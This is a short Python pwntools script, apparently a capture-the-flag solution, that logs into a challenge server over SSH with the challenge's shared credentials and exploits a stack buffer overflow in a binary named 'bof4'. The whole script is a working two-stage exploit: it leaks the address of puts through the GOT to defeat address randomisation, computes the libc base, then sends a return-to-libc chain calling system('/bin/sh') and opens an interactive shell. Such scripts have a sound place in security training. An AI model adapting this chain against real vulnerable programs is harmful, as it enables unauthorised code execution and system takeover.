from pwn import *

s= ssh(host='challenges.hackademint.org',user='pwn3r',password='pwn3r',port=30025)

padding = "a" * 62 

puts_plt   = 0x8049050
puts_got   = 0x804c014
pop_gadget = 0x0804901e
addr_main  = 0x080491c5

payload = padding.encode() + p32(puts_plt) + p32(pop_gadget) + p32(puts_got) +  p32(addr_main)
# print(payload)

libc = ELF("/lib32/libc.so.6")
p = s.process("./bof4")
p.recv()
p.sendline(payload)
puts_addr = int.from_bytes(p.recv()[0:4], byteorder='little')
print(f"leaked address : {hex(puts_addr)}")
libc.address = puts_addr - libc.sym["puts"]

payload = b"a" * 62
payload += p32(libc.sym["system"])
payload += p32(libc.sym["exit"])
payload += p32(next(libc.search(b'/bin/sh\x00')))

p.sendline(payload)
p.interactive()